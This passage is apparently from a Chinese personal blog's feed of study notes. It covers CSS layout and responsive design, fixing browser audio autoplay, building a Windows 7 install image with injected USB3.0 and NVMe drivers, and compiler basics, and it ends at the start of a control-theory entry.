<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;主内容栏宽度自适应&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;主内容栏宽度自适应&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;左侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;主内容栏宽度自适应&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;右侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;第1个侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;第2个侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;主内容栏宽度自适应&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;layout&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;main&quot;&gt;主内容栏宽度自适应&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;第1个侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">    &lt;aside class&#x3D;&quot;aside&quot;&gt;第2个侧边栏宽度固定&lt;&#x2F;aside&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.layout &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.main &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">.aside &#123;</span><br><span class="line">    width: 200px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="自适应与响应式布局"><a href="#自适应与响应式布局" class="headerlink" title="自适应与响应式布局"></a>自适应与响应式布局</h1><p>自适应是为了解决如何才能在不同大小的设备上呈现同样的网页，实现一次设计，普遍适用而提出的技术，以避免维护多个版本的针对不同分辨率设备的网页。</p>
<p>但自适应存在一个问题，如果屏幕太小，即使网页能够根据屏幕大小进行适配，但是会感觉在小屏幕上查看，内容过于拥挤。响应式正是为了解决这个问题而衍生出来的概念。它可以自动识别屏幕宽度、并做出相应调整的网页设计，布局和展示的内容可能会有所变动。</p>
<p>目前网页的响应式布局解决方案成为当前主流，并因 twitter 开源的 bootstrap 而被大家熟知。响应式布局的实现原理如下：</p>
<ul>
<li>允许网页宽度自动调整</li>
</ul>
<p>网页代码的头部，加入一行viewport元标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>viewport是网页默认的宽度和高度，上面这行代码的意思是，网页宽度默认等于屏幕宽度（width=device-width），原始缩放比例（initial-scale=1）为1.0，即网页初始大小占屏幕面积的100%。</p>
<ul>
<li>尽量少使用绝对宽度</li>
</ul>
<p>由于网页会根据屏幕宽度调整布局，所以不能使用绝对宽度的布局，也不能使用具有绝对宽度的元素。这一条非常重要。具体说，CSS代码不能指定像素宽度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">width:xxx px;</span><br></pre></td></tr></table></figure>

<p>通过指定百分比宽度来替代：同时还可以配合css的cal，进行计算宽度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">width: xx%;</span><br><span class="line">width:auto;</span><br></pre></td></tr></table></figure>

<ul>
<li>相对大小的字体</li>
</ul>
<p>字体也不能使用绝对大小（px），而只能使用相对大小（em）或者高清方案（rem）,rem不局限于字体大小，前面的宽度width也可以使用，代替百分比。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  font: normal 100% Helvetica, Arial, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码指定，字体大小是页面默认大小的100%，即16像素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h1 &#123;</span><br><span class="line">　　font-size: 1.5em; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，h1的大小是默认大小的1.5倍，即24像素（24/16=1.5）。</p>
<ul>
<li>流动布局（fluid grid）</li>
</ul>
<p>“流动布局”的含义是，各个区块的位置都是浮动的，不是固定不变的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.main &#123;</span><br><span class="line">　　float: right;</span><br><span class="line">　　width: 70%; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.leftBar &#123;</span><br><span class="line">　　float: left;</span><br><span class="line">　　width: 25%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>float的好处是，如果宽度太小，放不下两个元素，后面的元素会自动滚动到前面元素的下方，不会在水平方向overflow（溢出），避免了水平滚动条的出现。</p>
<ul>
<li>选择加载CSS</li>
</ul>
<p>“自适应网页设计”的核心，就是CSS3引入的Media Query模块。</p>
<p>它的意思就是，自动探测屏幕宽度，然后加载相应的CSS文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;</span><br><span class="line">　　　　media&#x3D;&quot;screen and (max-device-width: 400px)&quot;</span><br><span class="line">　　　　href&#x3D;&quot;tinyScreen.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;</span><br><span class="line">　　　　media&#x3D;&quot;screen and (min-width: 400px) and (max-device-width: 600px)&quot;</span><br><span class="line">　　　　href&#x3D;&quot;smallScreen.css&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>除了用html标签加载CSS文件，还可以在现有CSS文件中加载。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@import  url(&quot;tinyScreen.css&quot;) screen and (max-device-width: 400px);</span><br></pre></td></tr></table></figure>

<ul>
<li>CSS的@media规则</li>
</ul>
<p>同一个CSS文件中，也可以根据不同的屏幕分辨率，选择应用不同的CSS规则。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@media  screen and (max-device-width: 400px) &#123;</span><br><span class="line">　　.column &#123;</span><br><span class="line">　　　　float: none;</span><br><span class="line">　　　　width:auto;</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">　　#sidebar &#123;</span><br><span class="line">　　　　display:none;</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>图片的自适应（fluid image）</li>
</ul>
<p>除了布局和文本，”自适应网页设计”还必须实现图片的自动缩放。这只要一行CSS代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">img &#123; max-width: 100%;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="布局相关CSS"><a href="#布局相关CSS" class="headerlink" title="布局相关CSS"></a>布局相关CSS</h1><h2 id="display"><a href="#display" class="headerlink" title="display"></a>display</h2><p>display CSS 属性指定了元素的显示类型，它包含两类基础特征，用于指定元素怎样生成盒模型——<strong>外部显示类型</strong>定义了元素怎样参与流式布局的处理，<strong>内部显示类型</strong>定义了元素内子元素的布局方式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* &lt;display-outside&gt; values *&#x2F;</span><br><span class="line">display: block;</span><br><span class="line">display: inline;</span><br><span class="line">display: run-in;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-inside&gt; values *&#x2F;</span><br><span class="line">display: flow;</span><br><span class="line">display: flow-root;</span><br><span class="line">display: table;</span><br><span class="line">display: flex;</span><br><span class="line">display: grid;</span><br><span class="line">display: ruby;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-outside&gt; plus &lt;display-inside&gt; values *&#x2F;</span><br><span class="line">display: block flow;</span><br><span class="line">display: inline table;</span><br><span class="line">display: flex run-in;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-listitem&gt; values *&#x2F;</span><br><span class="line">display: list-item;</span><br><span class="line">display: list-item block;</span><br><span class="line">display: list-item inline;</span><br><span class="line">display: list-item flow;</span><br><span class="line">display: list-item flow-root;</span><br><span class="line">display: list-item block flow;</span><br><span class="line">display: list-item block flow-root;</span><br><span class="line">display: flow list-item block;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-internal&gt; values *&#x2F;</span><br><span class="line">display: table-row-group;</span><br><span class="line">display: table-header-group;</span><br><span class="line">display: table-footer-group;</span><br><span class="line">display: table-row;</span><br><span class="line">display: table-cell;</span><br><span class="line">display: table-column-group;</span><br><span class="line">display: table-column;</span><br><span class="line">display: table-caption;</span><br><span class="line">display: ruby-base;</span><br><span class="line">display: ruby-text;</span><br><span class="line">display: ruby-base-container;</span><br><span class="line">display: ruby-text-container;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-box&gt; values *&#x2F;</span><br><span class="line">display: contents;</span><br><span class="line">display: none;</span><br><span class="line"></span><br><span class="line">&#x2F;* &lt;display-legacy&gt; values *&#x2F;</span><br><span class="line">display: inline-block;</span><br><span class="line">display: inline-table;</span><br><span class="line">display: inline-flex;</span><br><span class="line">display: inline-grid;</span><br><span class="line"></span><br><span class="line">&#x2F;* Global values *&#x2F;</span><br><span class="line">display: inherit;</span><br><span class="line">display: initial;</span><br><span class="line">display: unset;</span><br></pre></td></tr></table></figure>

<h2 id="position"><a href="#position" class="headerlink" title="position"></a>position</h2><p>CSS position属性用于指定一个元素在文档中的定位方式。top，right，bottom 和 left 属性则决定了该元素的最终位置。position 属性被指定为从下面的值列表中选择的单个关键字：</p>
<ul>
<li>static</li>
</ul>
<p>该关键字指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。此时 top, right, bottom, left 和 z-index 属性无效。</p>
<ul>
<li>relative</li>
</ul>
<p>该关键字下，元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。position:relative 对 table-*-group, table-row, table-column, table-cell, table-caption 元素无效。</p>
<ul>
<li>absolute</li>
</ul>
<p>不为元素预留空间，通过指定元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。</p>
<ul>
<li>fixed</li>
</ul>
<p>不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。fixed 属性会创建新的层叠上下文。当元素祖先的 transform  属性非 none 时，容器由视口改为该祖先。</p>
<ul>
<li>sticky </li>
</ul>
<p>盒位置根据正常流计算(这称为正常流动中的位置)，然后相对于该元素在流中的 flow root（BFC）和 containing block（最近的块级祖先元素）定位。在所有情况下（即便被定位元素为 table 时），该元素定位均不对后续元素造成影响。当元素 B 被粘性定位时，后续元素的位置仍按照 B 未定位时的位置来确定。position: sticky 对 table 元素的效果与 position: relative 相同。</p>
<h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动(文档流)中移除，尽管仍然保持部分的流动性（与绝对定位相反）。float 属性的值被指定为单一的关键字，值从下面的值列表中选择:</p>
<ul>
<li>left</li>
</ul>
<p>表明元素必须浮动在其所在的块容器左侧的关键字。</p>
<ul>
<li>right</li>
</ul>
<p>表明元素必须浮动在其所在的块容器右侧的关键字。</p>
<ul>
<li>none</li>
</ul>
<p>表明元素不进行浮动的关键字。</p>
<ul>
<li>inline-start</li>
</ul>
<p>关键字，表明元素必须浮动在其所在块容器的开始一侧，在ltr脚本中是左侧，在rtl脚本中是右侧。</p>
<ul>
<li>inline-end</li>
</ul>
<p>关键字，表明元素必须浮动在其所在块容器的结束一侧，在ltr脚本中是右侧，在rtl脚本中是左侧。</p>
<p>float属性具有<strong>包裹性和高度欺骗</strong>两个特性。</p>
<h3 id="包裹性"><a href="#包裹性" class="headerlink" title="包裹性"></a>包裹性</h3><p>block元素不指定width的话，默认是100%，一旦让该div浮动起来，立刻会像inline元素一样产生包裹性，宽度会跟随内容自适应。（这也是通常float元素需要手动指定width的原因）。</p>
<p align="center">
    <img src="images/float1.png" width="60%" alt="float的包裹性"/>
</p>
<center>图3  float的包裹性</center>

<p>效果非常近似于display:inline-block。但相比之下，浮动能设定为左浮和右浮，但display:inline-block都是从左到右排列的。（还有些细微差别，两个display:inline-block间会有空隙，但两个float间没有。）</p>
<h3 id="高度欺骗性"><a href="#高度欺骗性" class="headerlink" title="高度欺骗性"></a>高度欺骗性</h3><p align="center">
    <img src="images/float2.png" width="60%" alt="float的高度欺骗性"/>
</p>
<center>图4  float的高度欺骗性</center>

<p>外层div在没有手动设定height的前提下，其高度是由内部content的最大高度决定的，由于img的float使得img具有高度塌陷的欺骗性，让div误以为img的line-height为0，因此div的高度就是文字的匿名inline-box的inline-height。</p>
<h3 id="闭合浮动"><a href="#闭合浮动" class="headerlink" title="闭合浮动"></a>闭合浮动</h3><p>闭合浮动的实现方法很多，最合理的方法是用:after伪元素，思路是用:after元素在div后面插入一个隐藏文本”.”，隐藏文本用clear来实现闭合浮动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.clearfix:after &#123;</span><br><span class="line">    clear: both;</span><br><span class="line">    content: &quot;.&quot;;   &#x2F;&#x2F;你头可以改成其他任意文本如“abc”</span><br><span class="line">    display: block;</span><br><span class="line">    height: 0;      &#x2F;&#x2F;高度为0且hidden让该文本彻底隐藏</span><br><span class="line">    visibility: hidden;</span><br><span class="line">&#125;</span><br><span class="line">.clearfix &#123;</span><br><span class="line">    *zoom: 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;border:4px solid blue;&quot; class&#x3D;&quot;clearfix&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;width:200px; border:4px solid red; float:left;&quot;&gt;</span><br><span class="line">        我是浮动元素1</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;width:200px; border:4px solid yellow; float:left;&quot;&gt;</span><br><span class="line">        我是浮动元素2</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div style&#x3D;&quot;border:4px solid gray;&quot;&gt;我是页脚&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/25565751" target="_blank" rel="noopener">CSS布局十八般武艺都在这里了</a>,by Shelley Lee.</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html?utm_source=tuicool" target="_blank" rel="noopener">Flex 布局教程：语法篇</a>,by 阮一峰.</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">Flex 布局教程：实例篇</a>,by 阮一峰.</li>
<li><a href="http://www.ruanyifeng.com/blog/2018/10/flexbox-form.html" target="_blank" rel="noopener">Flexbox 布局的最简单表单</a>,by 阮一峰.</li>
<li><a href="http://www.ruanyifeng.com/blog/2012/05/responsive_web_design.html" target="_blank" rel="noopener">自适应网页设计（Responsive Web Design）</a>,by 阮一峰.</li>
<li><a href="http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html" target="_blank" rel="noopener">CSS Grid 网格布局教程</a>,by 阮一峰.</li>
<li><a href="https://juejin.im/entry/58b6414a128fe1006421bfa7" target="_blank" rel="noopener">响应式和自适应的区别</a>,by LorinLuo.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display" target="_blank" rel="noopener">display</a>,by mozilla.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position" target="_blank" rel="noopener">position</a>,by mozilla.</li>
<li><a href="https://www.jianshu.com/p/07eb19957991" target="_blank" rel="noopener">CSS浮动float详解</a>,by 张歆琳.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/CSS/float" target="_blank" rel="noopener">float</a>,by mozilla.</li>
<li><a href="https://stackoverflow.com/questions/21515042/scrolling-a-flexbox-with-overflowing-content" target="_blank" rel="noopener">Scrolling a flexbox with overflowing content</a>,by stackoverflow.</li>
<li><a href="https://moduscreate.com/blog/how-to-fix-overflow-issues-in-css-flex-layouts/" target="_blank" rel="noopener">How to Fix Overflow Issues in CSS Flex Layouts</a>,by moduscreate.</li>
<li><a href="https://www.joshwcomeau.com/css/interactive-guide-to-flexbox/" target="_blank" rel="noopener">An Interactive Guide to Flexbox</a>,by joshwcomeau.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图像处理演示</title>
    <url>/2022/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E6%BC%94%E7%A4%BA/</url>
    <content><![CDATA[<p>图像处理的演示。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://fellipe.com/demos/lena-js/" target="_blank" rel="noopener">LENA.JS</a>,by Davidson Fellipe.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>网页音频无法自动播放的解决方案</title>
    <url>/2023/02/06/%E7%BD%91%E9%A1%B5%E9%9F%B3%E9%A2%91%E6%97%A0%E6%B3%95%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>最近在维护一个网页应用时，发现其音频偶尔无法自动播放，且报如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Uncaught (in promise) DOMException: play() failed because the user didn&#39;t interact with the document first.</span><br></pre></td></tr></table></figure>

<p>该错误产生原因是chrome66之后都禁止音视频的自动播放。要解决该问题，可以在用户首次进入页面时，提示用户点击启动音视频自动播放，模拟用户交互。js代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.confirm(&quot;是否启动语音自动播放？&quot;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>以上方法有问题，不能模拟用户交互，还是需要用户真正点击网页。另外还可以参考文章<a href="https://blog.csdn.net/m0_55591550/article/details/123757232" target="_blank" rel="noopener">解决浏览器无法自动播放音频的问题</a>的解决方案。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6844903605170864136" target="_blank" rel="noopener">Chrome 66禁止声音自动播放之后</a>,by 人人网FED.</li>
<li><a href="https://blog.csdn.net/m0_55591550/article/details/123757232" target="_blank" rel="noopener">解决浏览器无法自动播放音频的问题</a>,by 寻找_.</li>
<li><a href="https://segmentfault.com/q/1010000016921847" target="_blank" rel="noopener">chrome66 禁止自动播放后，有什么比较好的方法实现audio的自动播放吗？</a>,by segmentfault.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义Win7原版镜像安装光盘</title>
    <url>/2020/05/06/%E8%87%AA%E5%AE%9A%E4%B9%89Win7%E5%8E%9F%E7%89%88%E9%95%9C%E5%83%8F%E5%AE%89%E8%A3%85%E5%85%89%E7%9B%98/</url>
    <content><![CDATA[<p>因为Win10的安全问题和Win7用户习惯问题，新电脑要求装Win7系统。但是Win7系统中没有自带USB3.0驱动和固态硬盘nvme驱动，导致安装或启动Win7时USB3.0的鼠标和键盘无法识别，无法操纵。经过研究，决定在Win7原版镜像基础上，注入USB3.0和nvme驱动。</p>
<h1 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h1><ul>
<li>DISM++</li>
</ul>
<p>Dism++是一个Dism的GUI版，但是并不依赖Dism(Deployment Image Servicing and Management)，直接基于更底层的CBS(Component Based Servicing Reference)。</p>
<blockquote>
<p>Dism是一个命令行工具，可用于服务和准备Windows映像，包括用于Windows PE、Windows恢复环境（Windows RE）和Windows安装程序的映像。</p>
</blockquote>
<ul>
<li>easybcd</li>
</ul>
<p>EasyBCD是由NeoSmart Technologies开发的程序，用于配置和调整启动配置数据，该启动数据库最初是在Windows Vista中引入的，并在以后的所有Windows版本中使用。EasyBCD可用于为可同时安装某些版本的Windows，Linux，BSD和Mac OS X的计算机设置多重启动环境。<strong>例如删除OneKey Ghost启动项。</strong></p>
<ul>
<li>UltraISO</li>
</ul>
<p>UltraISO 是一个运行在Microsoft Windows平台上的用来创建、修改和转换ISO文件的软件。自从2002年4月20日UltraISO首次发布以来，它的开发公司EZB Systems就把它定义为一个共享软件。当前EZB Systems域名的注册地址在中国深圳。</p>
<p>UltraISO用于替换Windows启动镜像中的boot.wim和install.wim。</p>
<h1 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h1><p>Windows7原版镜像中有两个重要文件：install.wim和boot.wim。boot.wim本质时WinPe，用于安装Windows7时的启动，install.wim镜像文件用于Windows7安装后的启动。使用工具Dism++在boot.wim和install.wim中注入USB3.0和nvme驱动，可以确保Windows7系统在安装和启动过程中识别USB3.0的键盘和鼠标，以及固态硬盘，从而保证Windows7的顺序安装和启动。</p>
<h1 id="封装步骤"><a href="#封装步骤" class="headerlink" title="封装步骤"></a>封装步骤</h1><p>当前很多笔记本已不再支持Win7操纵系统，强行在新机器上安装Win7会出现很多问题。通过验证，总结了如下使用Win7封装步骤：</p>
<ol>
<li>制作WeiPE启动盘。WeiPE启动盘使用Win8PE，在新机器上能运行，同时也支持光盘启动。当使用Win7安装盘在新机器上安装操作系统时，如果出现USB3.0鼠标键盘无响应，可尝试使用WeiPE进入Win8PE，然后在Win8PE安装Win7操作系统到新机器上，同时在使用Dism++注入USB3.0和nvme驱动到Win7操作系统中。</li>
<li>封装Win7系统盘，主要处理boot.wim和install.wim两个文件。boot.wim主要用于自启动安装Win7操作系统，应在其中注入usb3.0和nvme驱动，防止出现安装时无法识别USB3.0的键盘和鼠标，以及固态硬盘的情况。install.wim是Win7的主要文件，使用Dism++在其中注入系统更新和常用软件。</li>
<li>下载EasyDrv驱动安装包，用于给机器安装相应驱动。</li>
</ol>
<p>通过上述三张光盘，相信安装Windows7操作系统不再是麻烦。</p>
<h1 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h1><ul>
<li>WinPE</li>
</ul>
<p>一种迷你系统，通常体积比较小，只有300MB左右。用于安装系统或者修复系统问题。</p>
<ul>
<li>WinRE</li>
</ul>
<p>跟WinPE几乎一样，只是WinRE更加侧重于系统修复，并且Vista以后系统自带WinRE，因此我们可以在WinRE做原本在WinPE里做的事情。</p>
<ul>
<li>映像文件（Image File）</li>
</ul>
<p>一种文件载体，可以保存系统映像。在Dism++中，映像文件有WIM、SWM、ESD以及ISO。</p>
<ul>
<li>UEFI</li>
</ul>
<p>统一可扩展固件接口（英语：Unified Extensible Firmware Interface，缩写UEFI）是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面，作为BIOS的替代方案。可扩展固件接口负责加电自检、联系操作系统以及提供连接操作系统与硬件的接口。</p>
<ul>
<li>BIOS</li>
</ul>
<p>BIOS是Basic Input/Output System的缩写，中文：基本输入输出系统，亦称为ROM BIOS、System BIOS、PC BIOS，是在通电引导阶段运行硬件初始化，以及为操作系统提供运行时服务的固件。BIOS最早随着CP/M操作系统的推出在1975年出现。BIOS预安装在个人电脑的主板上，是个人电脑启动时加载的第一个软件。</p>
<p>现在，BIOS的作用是初始化和测试硬件组件，以及从大容量存储设备（如硬盘）加载引导程序，并由引导程序加载操作系统。BIOS还为DOS操作系统提供键盘、显示及其他I/O设备的硬件抽象层。</p>
<p>许多BIOS程序都只能在特定电脑型号或特定主板型号上运行。早年，BIOS存储于ROM芯片上；现在的BIOS多存储于闪存芯片上，这方便了BIOS的更新。</p>
<p>UEFI是旧式BIOS的后继者。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/f9dc4f2ada2a" target="_blank" rel="noopener">win7原版镜像注入USB3.0和nvme驱动</a>,by 家麟.</li>
<li><a href="https://800.ywbb.com/28941.html" target="_blank" rel="noopener">连这都知道，足以证明你是windows系统安装的老司机了</a>,by IT教主.</li>
<li><a href="https://kknews.cc/code/o86gazq.html" target="_blank" rel="noopener">UEFI与Legacy+UEFI的区别有多大，不弄清楚要吃大亏！</a>,by 快启动.</li>
<li><a href="https://zh.wikipedia.org/wiki/BIOS" target="_blank" rel="noopener">BIOS</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/mao0514/article/details/48245143" target="_blank" rel="noopener">Windows PE入门基础知识：Windows PE的作用、命名规则、启动方式、启动原理</a>,by 毛毛虫的爹.</li>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/wpeinit-and-startnetcmd-using-winpe-startup-scripts" target="_blank" rel="noopener">Wpeinit and Startnet.cmd: Using WinPE Startup Scripts</a>,by microsoft.</li>
<li><a href="https://post.smzdm.com/p/alpz8xvo/" target="_blank" rel="noopener">WIN7进阶篇，如何制作封装USB3.0，NVME驱动的WIN7镜像</a>,by Dior.</li>
<li><a href="https://blog.csdn.net/tech34/article/details/127394725" target="_blank" rel="noopener">Win7安装驱动提示“无法验驱动程序数字签名”怎么办？</a>,by 左边右转第二排的张大爷.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理学习笔记</title>
    <url>/2019/12/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>编译原理是计算机专业的一门重要专业课，旨在介绍编译程序构造的一般原理和基本方法。内容包括语言和文法、词法分析、语法分析、语法制导翻译、中间代码生成、存储管理、代码优化和目标代码生成。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ul>
<li>词法分析 </li>
</ul>
<p>从左到右逐个字符地扫描，从中识别出一个个“单词”符号。“单词”符号是程序设计语言的基本语法单位，如关键字、标识符、常数、运算符和分隔符等。</p>
<ul>
<li>语法分析 </li>
</ul>
<p>根据语言的语法规则将单词符号序列分解成各类语法单位，比如表达式、语句和程序等。语法规则就是各类语法单位的构成规则。通过语法分析确定整个输入串是否构成一个语法上正确的程序。</p>
<ul>
<li>语义分析 </li>
</ul>
<p>检查源程序是否包含静态语义错误，并收集类型信息供后面的代码生成阶段使用。只有语法和语义都正确的源程序才能被翻译成正确的目标代码。</p>
<p>语义分析的一个主要工作是进行类型分析和检查。程序语言中的一个数据类型一般包含两个方面的内容：类型的载体及其上的运算。例如：整除取余运算只能对整型数据进行运算，若其运算对象中有浮点数就认为是类型不匹配的错误。静态的语义错误是指编译程序可以发现，动态的语义错误是指源程序虽然能够被编译和执行，但是结果不对，一般是逻辑上的错误。</p>
<h1 id="编译的过程"><a href="#编译的过程" class="headerlink" title="编译的过程"></a>编译的过程</h1><p>编译程序的工作过程一般可以分为5个阶段：</p>
<ol>
<li>词法分析</li>
<li>语法分析</li>
<li>语义分析和中间代码的产生</li>
<li>优化</li>
<li>目标代码生成</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://jartto.wang/2018/11/17/about-ast/" target="_blank" rel="noopener">AST 抽象语法树</a>,by Jartto.</li>
<li><a href="https://blog.csdn.net/cflys/article/details/71274116" target="_blank" rel="noopener">【编译原理】编译原理简单介绍</a>,by cflys.</li>
<li><a href="https://github.com/junhey/softwareDesigner/wiki/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86" target="_blank" rel="noopener">编译原理</a>,by junhey.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>自动控制原理笔记</title>
    <url>/2020/03/16/%E8%87%AA%E5%8A%A8%E6%8E%A7%E5%88%B6%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>记录自动控制原理的核心概念、方法。</p>
